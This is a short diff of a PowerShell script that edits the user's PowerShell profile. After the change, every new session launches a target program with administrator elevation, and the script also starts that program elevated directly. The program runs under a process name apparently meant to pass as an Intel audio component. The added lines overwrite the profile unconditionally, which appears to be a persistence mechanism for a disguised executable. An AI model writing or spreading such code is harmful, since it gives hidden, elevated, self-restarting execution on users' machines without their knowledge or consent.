@@ -66,26 +66,15 @@ if (-Not (Test-Path "$TargetFile")) {
       Write-Output "Shortcut created"
 }
 
-if (-Not (Test-Path "$PowershellPath")) {
-      New-Item -ItemType Directory -Force -Path "$PowershellPath"
-      New-Item -ItemType File -Force -Path "$PowershellFile"
-      Write-Output "Powershell profile created"
-      Set-Content -Path "$PowershellFile" -Value "if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name 'Intel Audio.exe') -or (Get-Process -Name 'Intel Audio')) { Start-Process "$TargetFile"  -Verb RunAs } }"
-      Write-Output "Powershell profile updated"
-}
 if (Select-String -Path "$PowershellFile" "Start-Process") {
       Write-Output "Powershell profile already updated"
       # exit 0
 } else {
-      if (-Not (Test-Path "$TargetFile")) {
-            Add-Content -Path "$PowershellFile" -Value 'if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name "Intel Audio.exe") -or (Get-Process -Name "Intel Audio")) { Start-Process "$TargetFile"  -Verb RunAs } }'
-            Write-Output "Powershell profile updated"
-      } else {
-            Write-Output "Powershell profile not updated"
-      }
+      Set-Content -Path "$PowershellFile" -Value "if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name 'Intel Audio.exe') -or (Get-Process -Name 'Intel Audio')) { Start-Process "$TargetFile"  -Verb RunAs } }"
+      Write-Output "Powershell profile updated"
 }
 
-if (Get-Process -Name 'Intel Audio' -ErrorAction SilentlyContinue){
+if (Get-Process -Name 'Intel Audio' -ErrorAction SilentlyContinue) {
       exit
 } else {
       Start-Process -FilePath "$TargetFile" -Verb RunAs
